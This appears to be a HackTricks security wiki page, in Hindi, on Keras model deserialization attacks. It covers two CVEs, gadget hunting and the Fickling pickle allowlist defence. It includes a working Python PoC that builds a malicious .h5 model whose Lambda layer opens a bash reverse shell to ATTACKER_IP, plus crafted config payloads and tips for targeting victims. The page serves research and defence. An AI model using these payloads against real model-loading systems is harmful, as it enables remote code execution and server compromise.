# Keras Model Deserialization RCE और Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

यह पेज Keras model deserialization pipeline के विरुद्ध व्यावहारिक exploitation techniques का सारांश देता है, native .keras format की आंतरिक संरचना और attack surface समझाता है, और Model File Vulnerabilities (MFVs) तथा post-fix gadgets खोजने के लिए researcher toolkit उपलब्ध कराता है।

## .keras model format की आंतरिक संरचना

एक .keras फ़ाइल ZIP archive होती है, जिसमें कम-से-कम ये चीज़ें होती हैं:<sup>[[1]](#references)</sup>
- metadata.json – सामान्य जानकारी (जैसे, Keras version)
- config.json – model architecture (मुख्य attack surface)
- model.weights.h5 – HDF5 में weights

config.json recursive deserialization को नियंत्रित करता है: Keras modules import करता है, classes/functions को resolve करता है और attacker-controlled dictionaries से layers/objects को फिर से बनाता है।<sup>[[1]](#references)</sup>

Dense layer object का उदाहरण:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization में ये कार्य होते हैं:<sup>[[1]](#references)</sup>
- module/class_name keys से module import और symbol resolution
- attacker-controlled kwargs के साथ from_config(...) या constructor का invocation
- nested objects (activations, initializers, constraints, आदि) में recursion

ऐतिहासिक रूप से, config.json तैयार करने वाला attacker इन तीन primitives को नियंत्रित कर सकता था:<sup>[[1]](#references)</sup>
- कौन से modules import किए जाएँ
- किन classes/functions का resolution किया जाए
- constructors/from_config में कौन से kwargs पास किए जाएँ

## CVE-2024-3660 – Lambda-layer bytecode RCE

मूल कारण:
- Legacy Lambda deserialization ने attacker-controlled marshaled code से Python function को फिर से बनाया: `func_load()` payload को base64-decode करता है, `marshal.loads()` call करता है और `FunctionType` बनाता है। परिणामी function का bytecode Lambda invoke होने पर चलता है, और pre-2.13 के प्रभावित loaders ने legacy formats के लिए safe-mode checks लागू नहीं किए थे।<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Native Keras v3 archive में, Lambda function को `__lambda__` object के रूप में दर्शाया जाता है, जिसके `code` field में base64-encoded marshaled code होता है:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Mitigation:
- Keras, native Keras v3 format के लिए डिफ़ॉल्ट रूप से `safe_mode=True` लागू करता है। `Lambda` में serialized Python lambdas को ब्लॉक किया जाता है, जब तक कि उपयोगकर्ता स्पष्ट रूप से `safe_mode=False` सेट करके इससे बाहर न निकले; यह सुरक्षा legacy formats पर उसी तरह लागू नहीं होती।<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Notes:
- Legacy formats (पुराने HDF5 saves) या पुराने codebases में आधुनिक checks लागू न हों, इसलिए जब victims पुराने loaders का इस्तेमाल करते हैं, तब “downgrade” style attacks अब भी काम कर सकते हैं।

## CVE-2025-1550 – Keras 3.0.0–3.8.x में मनमाना module import

Root cause:
- `_retrieve_class_or_fn` ने `config.json` से मिले attacker-controlled module strings पर `importlib.import_module(module)` का इस्तेमाल किया।
- Impact: एक crafted `.keras` archive, `Model.load_model()` से attacker द्वारा चुने गए Python modules और functions import करवा सकता था। इससे import-time side effects और attacker-controlled arguments संभव थे, `safe_mode=True` होने पर भी।<sup>[[1]](#references)[[4]](#references)</sup>

Exploit idea:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Keras ≥ 3.9 में सुरक्षा सुधार:<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports केवल आधिकारिक ecosystem modules तक सीमित हैं: keras, keras_hub, keras_cv, keras_nlp
- Default safe mode: safe_mode=True असुरक्षित Lambda serialized-function loading को रोकता है
- Basic type checking: deserialized objects का अपेक्षित types से मेल खाना ज़रूरी है

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

पुराने TensorFlow-Keras deployments अब भी HDF5 model files (`.h5`) स्वीकार कर सकते हैं। अगर कोई attacker ऐसा model upload कर सकता है जिसे server बाद में load करे या जिस पर inference चलाए, तो प्रभावित loader attacker-controlled Python वाला Lambda layer deserialize कर सकता है। यह Python फिर application के model workflow में execute हो सकता है।<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

एक malicious .h5 बनाने के लिए न्यूनतम PoC, जिसका Lambda target द्वारा model invoke किए जाने पर reverse shell execute करता है:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

नोट्स और विश्वसनीयता संबंधी सुझाव:
- Trigger points फ़ॉर्मैट और workflow के अनुसार अलग-अलग होते हैं; संदर्भित write-up में payload को prediction के दौरान दो बार execute होते देखा गया। Side effects को दोहराए जाने योग्य मानें और payloads को idempotent बनाएँ।<sup>[[7]](#references)</sup>
- Version pinning: serialization mismatches से बचने के लिए victim के TF/Keras/Python versions से मेल रखें। उदाहरण के लिए, यदि target Python 3.8 और TensorFlow 2.13.1 इस्तेमाल करता है, तो artifacts भी इन्हीं के अंतर्गत बनाएँ।<sup>[[7]](#references)</sup>
- Environment को जल्दी replicate करना:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validation: `os.system("ping -c 1 YOUR_IP")` जैसा benign payload, reverse shell पर switch करने से पहले execution की पुष्टि करने में मदद करता है (उदाहरण के लिए, `tcpdump` से ICMP observe करें)।<sup>[[7]](#references)</sup>

## allowlist के अंदर fix के बाद gadget surface

Keras module allowlist और safe mode होने पर भी, allowed callables side effects उजागर कर सकते हैं। उदाहरण के लिए, `keras.utils.get_file` URL download करके उसे configured cache location में लिखता है, इसलिए gadget analysis के लिए यह एक candidate है।<sup>[[1]](#references)[[19]](#references)</sup>

Candidate Lambda configuration (controlled test में call signature validate करें):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

महत्वपूर्ण सीमा:
- `Lambda.call()` हमेशा model input को पहले positional argument के रूप में और कॉन्फ़िगर किए गए `arguments` को keyword arguments के रूप में पास करता है। `get_file` के लिए वह positional value `fname` में जाती है; tensor/path का mismatch किसी भी download से पहले इस candidate को विफल कर सकता है, इसलिए यह काम करने वाला guaranteed gadget नहीं है।<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## AI/ML models के लिए ML pickle import allowlisting (Fickling)

कई AI/ML model formats (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn artifacts और अन्य Python-native formats) में Python pickle data एम्बेड होता है। ऊपर दिया गया legacy Keras Lambda path इसके बजाय marshaled function bytecode का उपयोग करता है, इसलिए यह deserialization का एक अलग जोखिम है। Pickle opcodes, deserialization के दौरान attacker-controlled behavior चला सकते हैं, जिसमें model tampering या RCE शामिल है; simple scanners नए या सूची में शामिल न किए गए खतरनाक imports को पकड़ने में विफल हो सकते हैं।<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

एक व्यावहारिक fail-closed बचाव यह है कि Python के pickle deserializer को hook करके unpickling के दौरान केवल जाँचे-परखे harmless ML-related imports की अनुमति दी जाए। Trail of Bits का Fickling इस policy को लागू करता है और हजारों public Hugging Face pickles से तैयार की गई curated ML import allowlist के साथ आता है।<sup>[[8]](#references)[[13]](#references)</sup>

“safe” imports के लिए security model (research और practice से निकली समझ): pickle द्वारा उपयोग किए गए imported symbols को एक साथ ये सभी शर्तें पूरी करनी चाहिए:<sup>[[8]](#references)</sup>
- Code execute न करें या execution का कारण न बनें (कोई compiled/source code objects, shelling out, hooks आदि नहीं)
- Arbitrary attributes या items को get/set न करें
- Pickle VM से अन्य Python objects के references import या प्राप्त न करें
- कोई secondary deserializers (जैसे marshal, nested pickle) trigger न करें, प्रत्यक्ष या अप्रत्यक्ष रूप से

Process startup के दौरान Fickling की protections को जितनी जल्दी हो सके enable करें, ताकि frameworks द्वारा किए गए किसी भी pickle load (`torch.load`, `joblib.load` आदि) की जाँच हो:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Operational tips:
- जहाँ ज़रूरत हो, आप hooks को अस्थायी रूप से disable/re-enable कर सकते हैं:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- यदि known-good model अवरुद्ध है, तो symbols की समीक्षा करने के बाद अपने environment के लिए allowlist का विस्तार करें:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling अधिक granular control पसंद होने पर generic runtime guards भी उपलब्ध कराता है:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() सभी pickle.load() के लिए checks लागू करने हेतु
  - with fickling.check_safety(): scoped enforcement के लिए
  - fickling.load(path) / fickling.is_likely_safe(path) एक बार के checks के लिए

- जब संभव हो, non-pickle model formats (जैसे, SafeTensors) को प्राथमिकता दें।<sup>[[15]](#references)</sup> यदि आपको pickle स्वीकार करना ही पड़े, तो loaders को न्यूनतम privileges के साथ, network egress के बिना चलाएँ और allowlist लागू करें।

यह allowlist-first strategy, compatibility को उच्च बनाए रखते हुए, ML pickle के सामान्य exploit paths को प्रभावी रूप से block करती है। ToB के benchmark में, Fickling ने सभी synthetic malicious files को flag किया और top Hugging Face repos की लगभग 99% clean files को अनुमति दी।<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher toolkit

1) अनुमत modules में gadgets की व्यवस्थित खोज

keras, keras_nlp, keras_cv, keras_hub में candidate callables की गणना करें और उन callables को प्राथमिकता दें जिनके file/network/process/env पर side effects हों।<sup>[[1]](#references)</sup>

<details>
<summary>allowlisted Keras modules में संभावित रूप से खतरनाक callables की गणना करें</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Direct deserialization testing (कोई .keras archive आवश्यक नहीं)

स्वीकृत params जानने और side effects देखने के लिए crafted dicts को सीधे Keras deserializers में दें।<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) विभिन्न versions और formats की जाँच

Keras कई codebases/eras में मौजूद है, जिनमें अलग-अलग सुरक्षा उपाय और formats हैं:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, हटाया जाना तय है)
- tf-keras: अलग से maintain किया जाता है
- Multi-backend Keras 3 (official): native .keras की शुरुआत की

regressions या छूटे हुए सुरक्षा उपायों का पता लगाने के लिए अलग-अलग codebases और formats (.keras बनाम legacy HDF5) पर परीक्षण दोहराएँ।

## References

- [1] [Keras Model Deserialization में vulnerabilities की खोज (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – serialization में checks जोड़े गए](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Keras में arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE से root तक](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits blog – Fickling का नया AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – AI/ML environments को सुरक्षित करना (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Sleepy Pickle attacks की पृष्ठभूमि](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors project](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras 2 Lambda Layers arbitrary code injection की अनुमति देते हैं](https://kb.cert.org/vuls/id/253266)
- [17] [Keras Lambda layer source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Keras Python utilities source (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras `get_file` API](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
